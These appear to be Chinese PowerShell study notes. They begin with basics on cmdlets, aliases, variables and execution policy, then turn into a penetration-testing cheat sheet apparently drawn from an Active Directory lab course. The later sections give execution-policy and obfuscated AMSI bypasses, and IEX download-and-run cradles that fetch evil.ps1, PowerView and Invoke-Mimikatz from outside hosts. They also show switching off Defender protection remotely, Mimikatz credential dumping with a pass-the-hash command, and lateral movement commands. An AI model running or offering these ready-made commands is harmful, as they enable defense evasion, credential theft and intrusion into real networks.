# Powershell 使用

PowerShell是跨平台的任务自动化和配置管理框架，由命令行外壳和脚本语言组成。与大多数接受并返回文本的外壳程序不同，PowerShell构建于.NET公共语言运行时（CLR）之上，并接受并返回.NET对象。这一根本性变化带来了全新的自动化工具和方法。

powershell需要.net环境的支持

- Get-Host

```powershell
windows2008/windows7    2.0
windows8/2012           3.0
windows8.1/2012 r2      4.0
windows10               5.0
```

- 命令格式

```l
<command name > -<所需的参数名称> <所需的参数值>
命令 名称 请求参数名 请求参数值
Get-Service -name XblAuthManager
```

- powershell小知识

```powershell
`|`管道 `>`为覆盖，`>>`追加。
Powershell 能够像CMD一样很好的执行外部命令。
我们可以把powershell当成一个计算器。常用的加减乘除模（+,-,*,/,%）运算和小括号表达式都支持。
cmdlets是Powershell的内部命令
cmdlet 的名称由一个动词和一个名词组成，其功能对用户来讲一目了然。

Get-Verb    # 查看所有动词
Get-History     # 查看使用过的命令
Get-Help ls     # 查看命令的帮助信息
Get-Help *      # 列出关于帮助主题的所有内容。
Get-Help process    # 列出包含进程这个词的所有内容。
Update-Help     # 更新帮助系统(v3+)
Get-Help Get-Item -Full     # 列出关于主题的完整帮助(本例为Get-Item cmdlet)
Get-Help Get-Item -Examples     # 列出如何运行cmdlet的示例(本例中为Get-Item cmdlet)。
Get-Command -CommandType cmdlet     # 命令列出所有cmdlet
```

- 别名相关

```powershell
Get-Alias -name ls  # 查询别名所指的真实cmdlet命令
`ls alias:` || `Get-Alias`    # 查看可用的别名：可以通过
# 查看所有以Remove打头的cmdlet的命令
dir alias: | where {$_.Definition.Startswith("Remove(可以是所有动词)")}
# 通过命令查看所有别名和指向cmdlet的别名的个数
ls alias: | Group-Object definition | sort -Descending Count

创建自己的别名：别名不用删除，自定义的别名在powershell退出时会自动清除。
Set-Alias -Name Edit -Value notepad     # 创建
Edit        # 运行
$alias:Edit     # 查看
del alias:Edit  # 删除
Export-Alias ./1.ps1    # 导出别名
Import-Alias 1.ps1      # 导入别名
Import-Alias -Force 1.ps1   # 强制导入别名

简单的别名无法完成上述需求，可以通过函数来完成它
# 定义别名函数
function test-conn { Test-Connection  -Count 2 -ComputerName $args}
# 使用定义的函数
test-conn  localhost
```

- 变量

```powershell
# 定义变量
$a=10
# 查看变量
ls variable:
# 查找变量
ls variable:value*
# value2变量是否存在
Test-Path variable:value2
# 删除变量：变量会在powershell退出或关闭时，自动清除
del variable:value1
# powershell提供了五个专门管理变量的命令Clear-Variable，Get-Variable，New-Variable，Remove-Variable，Set-Variable。
# 变量写保护：可以使用New-Variable 的option选项 在创建变量时，给变量加上只读属性，这样就不能给变量重新赋值了。但是可以通过删除变量，再重新创建变量更新变量内容。
New-Variable num -Value 100 -Force -Option readonly
# 选项Constant，常量一旦声明，不可修改
new-variable num -Value "strong" -Option constant
# 变量描述：在New-Variable 可以通过-description 添加变量描述，但是变量描述默认不会显示，可以通过Format-List 查看。
new-variable name -Value "me" -Description "This is my name"
ls Variable:name | fl *

# 查找环境变量
ls env:
# 创建新的环境变量
$env:TestVar1="This is my environment variable"
# 删除和更新环境变量
del env:windir
$env:windir="Redhat Linux"
# 环境变量的操作只会影响当前powershell会话，并没有更新在机器上。

# Powershell支持四个作用域：全局、当前、私有和脚本。
# $global | $script | $private | $local
```

## 关于脚本

脚本和批处理都属于伪可执行文件，它们只是包含了若干命令行解释器能够解释和执行的命令行代码。

```powershell
Import-Module <modulepath>      # 导入模块
Get-Command -Module <modulename>    # 列出模块中的所有命令
```

- Powershell调用入口的优先级

1. 别名：控制台首先会寻找输入是否为一个别名，如果是，执行别名所指的命令。因此我们可以通过别名覆盖任意powershell命令，因为别名的优先级最高。
2. 函数：如果没有找到别名，会继续寻找函数，函数类似别名，只不过它包含了更多的powershell命令。因此可以自定义函数扩充cmdlet 把常用的参数给固化进去。
3. 命令：如果没有找到函数，控制台会继续寻找命令，即cmdlet，powershell的内部命令。
4. 脚本：没有找到命令，继续寻找扩展名为`.ps1`的Powershell脚本。
5. 文件：没有找到脚本，会继续寻找文件，如果没有可用的文件，控制台会抛出异常。

- 执行后缀为ps1文件策略问题

无法加载：Powershell脚本执行策略是默认不允许执行任何脚本，如果我们没有修改过执行策略而直接运行可能出现报错

```powershell
Get-ExecutionPolicy     # 查看执行策略是否可加载脚本
Get-ExecutionPolicy -list     # 查看执行策略
Set-ExecutionPolicy Restricted      # 设置为不可加载脚本(管理员)
Set-ExecutionPolicy remotesigned    # 设置为可加载脚本(管理员)
```

- 绕过PowerShell执行策略方法

```powershell
1、本地权限绕过
PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1

2、本地隐藏权限绕过执行脚本
PowerShell.exe -ExecutionPolicy Bypass -NoLogo -Nonlnteractive -NoProfile -WindowStyle Hidden(隐藏窗口) -File xxx.ps1

3、用IEX下载远程PS1脚本回来权限绕过执行
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI');Invoke-Mimikatz-DumpCreds"

4、在IEX在内存中加载此脚本，检查漏洞
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('C:\PowerUp.ps1'); Invoke-AllChecks"

5、在cmd环境导入模块绕过策略执行
powershell.exe -exec bypass -Command "& {Import-Module c:\PowerUp.ps1; Invoke-AllChecks}"

6、课程中绕过规则
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

```

## 下载执行

```powershell
# 下载执行
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

# 加载到内存执行（只能绕过powershell策略，而不能绕过杀软对powerview的检测）
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.67:8000/powerview.ps1');Get-NetDomainController"

# 绕过powershell策略下载
powershell -ExecutionPolicy Bypass  -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.99.41:8080/11.ps1','.\111111.ps1')"

# 下载后直接能运行，课程中的命令
iex (iwr http://172.16.100.41:8088/Invoke-Mimikatz.ps1 -UseBasicParsing)

$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1
');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

PSv3 onwards - iex (iwr 'http://192.168.230.1/evil.ps1')

$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText

$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

```

- 可以使用下列命令列出可用的Cmdlsets

```powershell
Get-Module -ListAvailable
Get-Command -module ActiveDirectory
````

- PowerShell中与 AD 模块有关的 Cmdlets

```powershell
Windows Server 2008 R2: 76 个 cmdlets
Windows Server 2012: 135 个 cmdlets
Windows Server 2012 R2: 147 个 cmdlets
````

- 以下是在WINDOWS SERVER 2008 R2上常用的Cmdlets

```powershell
Get/Set-ADForest
Get/Set-ADDomain
Get/Set-ADDomainController
Get/Set-ADUser
Get/Set-ADComputer
Get/Set-ADGroup
Get/Set-ADGroupMember
Get/Set-ADObject
Get/Set-ADOrganizationalUnit
Enable-ADOptionalFeature
Disable/Enable-ADAccount
Move-ADDirectoryServerOperationMasterRole
New-ADUser
New-ADComputer
New-ADGroup
New-ADObject
New-ADOrganizationalUnit
```

- 下面是在WINDOWS SERVER 2012+上新提供的Cmdlets（部分）

```powershell
*-ADResourcePropertyListMember
*-ADAuthenticationPolicy
*-ADAuthenticationPolicySilo
*-ADCentralAccessPolicy
*-ADCentralAccessRule
*-ADResourceProperty
*-ADResourcePropertyList
*-ADResourcePropertyValueType
*-ADDCCloneConfigFile
*-ADReplicationAttributeMetadata
*-ADReplicationConnection
*-ADReplicationFailure
*-ADReplicationPartnerMetadata
*-ADReplicationQueueOperation
*-ADReplicationSite
*-ADReplicationSiteLink
*-ADReplicationSiteLinkBridge
*-ADReplicationSubnet
*-ADReplicationUpToDatenessVectorTable
Sync-ADObject
```

## 与AD相关的PowerShell Cmdlets

枚举域，映射目标域的活动目录，各种实体、信任、关系和特权。通过使用本机可执行文件和.NET来完成

```powershell
# 显示域的所有信息
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain()
# 获取当前域：
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().Name
# 获取计算机的站点：
[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite()
# 列出域中所有的域控制器：
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
# 获取AD域模式：
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainMode
# 列出AD FSMO：
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).SchemaRoleOwner
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).NamingRoleOwner
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).InfrastructureRoleOwner
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).RidRoleOwner
# 获取AD林名称：
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Name
# 获取AD林中的站点列表：
[array] $ADSites = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites
# 获取AD林中的域:
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Domains
# 获取AD林中的全局编录器:
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs
# 获取AD林模式:
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ForestMode
# 获取AD林中的根域:
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().RootDomain

运行结果：
-------------------------
Forest(域森林)                  : moneycorp.local
DomainControllers(域控制器)     : {dcorp-dc.dollarcorp.moneycorp.local}
Children(子域)                  : {us.dollarcorp.moneycorp.local}
DomainMode(域模型)              : Unknown
DomainModeLevel(域运行级别)     : 7
Parent(父域)                    : moneycorp.local
PdcRoleOwner                    : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner                    : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner         : dcorp-dc.dollarcorp.moneycorp.local
Name(当前域)                    : dollarcorp.moneycorp.local
```

- Get-WmiObject 管理电源，服务，进程，系统，cpu，硬盘，内存，网络IP…

```powershell
| select Name   # 管道
| Out-File -Encoding utf8 win32Class.txt    # 输出命令保存
Get-WmiObject       # 获取电源，服务，进程，系统，网络IP
Get-WmiObject -List win32*      # 列出Get-WmiObject所有的class
Get-WmiObject -Class Win32_Battery      # 查看电脑电源，电池信息
Get-WmiObject -class win32_service      # 查看所有服务
Get-WmiObject -Class Win32_Process      # 电脑上的进程
Get-WmiObject -Class win32_processor    # 获取计算机CPU信息
get-wmiobject -class win32_service | select pathname    # 获取程序的路径
Get-WmiObject -Class Win32_NetworkAdapterConfiguration      # 获取IP地址
```

## 横向渗透

- 连接域

```powershell
Enter-Pssession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local # 连接到域管理员机器
whoami /priv    # 查看权限

# 对远程执行命令
Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local  -Scriptblock{whoami;hostname}

# 对远程执行
Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local  -Scriptblock{$ExecutionContext.SessionState.LanguageMode}

# 对远程执行脚本（可能会有问题）
Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath c:\AD\Tools\hello.ps1

# 对远程执行函数
. ./hello.ps1   # 先引入脚本
hello           # 执行函数
Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -Scriptblock ${function:hello}  # 执行

Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

# 对远程执行脚本
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local


Enter-PSSession -Session $sess
hello

# 指定用户
Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator

```

横向的其他命令

```powershell

Get-AppLockerPolicy -Effective | select -ExpandProperty rulecollections # 获取主机文件权限(反弹出来的不好使)

Copy-Item C:\AD\Tools\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv\c$\'Program Files'   # 将文件拷贝到有权限的域空中

Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
```

iex (iwr http://172.16.100.41/Invoke-Mimikatz.ps1 -UseBasicParsing)

powershell -ExecutionPolicy Bypass  -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.100.41:8088/Invoke-Mimikatz.ps1','.\111111.ps1')"